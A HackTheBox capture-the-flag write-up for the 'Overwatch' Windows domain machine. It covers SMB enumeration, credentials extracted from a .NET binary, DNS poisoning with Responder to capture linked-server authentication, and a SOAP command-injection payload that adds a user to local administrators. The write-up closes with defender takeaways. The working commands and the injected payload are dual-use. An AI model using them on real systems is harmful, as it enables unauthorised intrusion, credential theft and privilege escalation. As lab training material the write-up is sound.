# Overwatch — HackTheBox Writeup

**Target:** `10.129.244.81` (`overwatch.htb`)
**Difficulty:** Medium
**Techniques:** SMB anonymous enumeration → .NET assembly reverse engineering → MSSQL linked server abuse → NTLM relay via Responder → WCF SOAP command injection → local privilege escalation

---

## 1. Recon

Started with a full TCP port scan to see everything the box had open:

```bash
nmap -p- --min-rate 5000 -oN fullscan.txt 10.129.244.81
```

The result immediately screamed "Domain Controller" — Kerberos, LDAP, SMB, RPC, Global Catalog, and WinRM were all present:

```
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
6520/tcp  open  unknown
9389/tcp  open  adws
```

Port `6520` stood out as non-standard — that turned out later to be a Microsoft SQL Server instance. A follow-up service/version scan against a smaller set of ports confirmed SMB signing was enabled and required, and gave a rough clock skew:

```bash
nmap -sC -sV -p 22,80,445,8080 -oN services.txt 10.129.244.81
```

```
445/tcp   open  microsoft-ds?
smb2-security-mode: 3:1:1
  Message signing enabled and required
```

## 2. SMB Enumeration — Anonymous Access

Since this looked like an AD environment, I tried an anonymous/guest SMB session first:

```bash
smbclient -L //10.129.244.81 -U guest%
```

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
software$       Disk
SYSVOL          Disk      Logon server share
```

The `software$` share isn't a default one — that's worth digging into:

```bash
smbclient //10.129.244.81/software$ -U guest%
```

Inside, a `monitoring` folder held a small .NET application:

```
smb: \> cd monitoring
smb: \monitoring\> ls
  overwatch.exe
  overwatch.exe.config
  overwatch.pdb
  EntityFramework.dll
  System.Data.SQLite.dll
  ...
smb: \monitoring\> get overwatch.exe
smb: \monitoring\> get overwatch.exe.config
```

## 3. Reading the Config File

`overwatch.exe.config` is a standard .NET WCF service config, and it gave away the application's purpose immediately:

```bash
cat overwatch.exe.config
```

```xml
<system.serviceModel>
  <services>
    <service name="MonitoringService">
      <host>
        <baseAddresses>
          <add baseAddress="http://overwatch.htb:8000/MonitorService" />
        </baseAddresses>
      </host>
      <endpoint address="" binding="basicHttpBinding" contract="IMonitoringService" />
      <endpoint address="mex" binding="mexHttpBinding" contract="IMetadataExchange" />
    </service>
  </services>
  ...
  <serviceMetadata httpGetEnabled="True" />
  <serviceDebug includeExceptionDetailInFaults="True" />
</system.serviceModel>
```

So this is a WCF SOAP service (`MonitoringService`) exposed over `basicHttpBinding` on port `8000`, with metadata exchange and debug fault details enabled — both handy details for later. The EF provider block also confirmed the app talks to both SQL Server and SQLite, which fits a "monitoring" agent that ships credentials for a database connection.

## 4. Decompiling the Binary

To find those embedded credentials, I needed to look inside `overwatch.exe`. Since it's a .NET assembly, `mono-devel` gives us `monodis`, a handy IL disassembler:

```bash
sudo apt install mono-devel -y
monodis overwatch.exe > overwatch_il.txt
```

Then just grepped the IL dump for string loads (`ldstr`) that looked like connection info:

```bash
grep -i "ldstr" overwatch_il.txt | grep -i "server\|password\|user"
```

```
IL_0001:  ldstr "Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;"
```

Hardcoded SQL Server credentials, sitting right in the binary. Textbook.

## 5. Landing on MSSQL

Armed with `sqlsvc:TI0LKcfHzZw1Vv`, I connected to the SQL Server instance found on port `6520` using `impacket-mssqlclient` with Windows authentication:

```bash
impacket-mssqlclient 'overwatch.htb/sqlsvc:TI0LKcfHzZw1Vv@10.129.244.81' -port 6520 -windows-auth
```

```
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232)
SQL (OVERWATCH\sqlsvc  guest@master)>
```

We're in as a low-privileged database login. Time to look for a way to pivot.

## 6. Abusing a Linked Server

A quick check for linked servers turned up something interesting:

```sql
EXEC sp_linkedservers;
```

```
SRV_NAME              SRV_PROVIDERNAME  SRV_PRODUCT  SRV_DATASOURCE
---------------------  ----------------  -----------  ---------------
S200401\SQLEXPRESS     SQLNCLI           SQL Server   S200401\SQLEXPRESS
SQL07                  SQLNCLI           SQL Server   SQL07
```

`SQL07` doesn't resolve to anything I control — it's just a hostname the linked server config trusts. Trying to query through it directly failed, since `SQL07` isn't resolvable/reachable as expected:

```sql
SELECT * FROM OPENQUERY([SQL07], 'SELECT @@version');
```

```
ERROR(MSOLEDBSQL): TCP Provider returned message "Communication link failure".
```

The idea: if I can make `SQL07` resolve to *my* machine instead of the real host, the linked server login will try to authenticate to me — and I can capture that authentication with Responder.

Since `sqlsvc` had enough rights over the domain's DNS zone, I added a malicious DNS `A` record for `SQL07` pointing at my attack box using `bloodyAD`:

```bash
bloodyAD --host 10.129.244.81 -d overwatch.htb -u sqlsvc -p TI0LKcfHzZw1Vv add dnsRecord SQL07 10.10.15.244
```

```
[+] SQL07 has been successfully added
```

Then I started Responder on my tun0 interface to catch the incoming SQL/NTLM authentication:

```bash
sudo responder -I tun0 -v
```

With Responder listening, I re-ran the `OPENQUERY` call against the linked server:

```sql
SELECT * FROM OPENQUERY([SQL07], 'SELECT @@version');
```

Because `SQL07` now resolved to my box, the SQL Server tried to authenticate the linked-server login against my fake service — and Responder captured the credentials for a domain account, `sqlmgmt`.

## 7. Shell as sqlmgmt

With `sqlmgmt`'s captured password, I connected over WinRM using Evil-WinRM:

```bash
evil-winrm -i 10.129.244.81 -u sqlmgmt -p 'bIhBbzMMnB82yx'
```

```
*Evil-WinRM* PS C:\Users\sqlmgmt\Documents> whoami
overwatch\sqlmgmt
```

Grabbed the user flag from the Desktop:

```
*Evil-WinRM* PS C:\Users\sqlmgmt\Desktop> type user.txt
```
*(flag redacted, submitted on the platform)*

## 8. Privilege Escalation — The Monitoring Service Again

Checking local listening ports showed the same `MonitoringService` from earlier, this time running locally on the box:

```bash
netstat -ano | findstr LISTENING
```

```
TCP    0.0.0.0:8000    0.0.0.0:0    LISTENING    4
```

Recall from the config file: this WCF service exposes an `IMonitoringService` contract over `basicHttpBinding`, with debug faults enabled and no obvious authentication on the local endpoint. One of its exposed operations, `KillProcess`, takes a `processName` parameter — and passes it straight through to a shell/process call without sanitizing it, making it vulnerable to command injection.

I built a raw SOAP request to hit that method directly, injecting a second command via `;` into the `processName` field to add `sqlmgmt` to the local Administrators group:

```powershell
$headers = @{
  "SOAPAction" = "http://tempuri.org/IMonitoringService/KillProcess"
}

$soapPayload = @"
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
<s:Body>
<KillProcess xmlns="http://tempuri.org/">
<processName>notepad -Force; net localgroup administrators sqlmgmt /add</processName>
</KillProcess>
</s:Body>
</s:Envelope>
"@

Invoke-WebRequest -Uri "http://localhost:8000/MonitorService" `
  -Method POST `
  -Body $soapPayload `
  -ContentType "text/xml; charset=utf-8" `
  -Headers $headers `
  -UseBasicParsing
```

```
StatusCode        : 200
StatusDescription : OK
Content           : <KillProcessResponse ...>The command completed with one or more errors.
```

The "errors" are just `notepad -Force` failing (it's not a real flag), but the chained `net localgroup` command executed fine. A quick check confirmed it:

```powershell
net localgroup administrators
```

```
Members
-------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
sqlmgmt
```

`sqlmgmt` is now a local administrator.

## 9. Root

All that was left was to drop the current session and reconnect so the new group membership takes effect:

```bash
evil-winrm -i 10.129.244.81 -u sqlmgmt -p 'bIhBbzMMnB82yx'
```

```
*Evil-WinRM* PS C:\Users\sqlmgmt\Documents> cd C:\Users\Administrator\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
```
*(flag redacted, submitted on the platform)*

Root. 🎉

## 10. Summary / Lessons Learned

This box chained together a nice variety of real-world misconfigurations:

1. **Anonymous SMB share access** exposed an internal monitoring application, which should never have been world-readable.
2. **Hardcoded database credentials** inside a compiled .NET binary — trivially recovered with a free IL disassembler.
3. **Untrusted linked server configuration** in MSSQL, combined with excessive DNS-write privileges for a service account, allowed a classic NTLM-relay-via-DNS-poisoning attack against `sp_linkedservers`.
4. **An internal WCF SOAP service with no input validation**, running as a privileged context, allowed command injection through a parameter that was passed unsanitized into process execution — a straightforward but effective local privesc.

Takeaways for defenders: disable anonymous SMB access, never ship credentials inside binaries (use a secrets manager / DPAPI / managed identity instead), lock down linked server trust relationships and DNS write permissions for service accounts, and validate/sanitize every parameter that reaches a shell — even on "internal only" services.

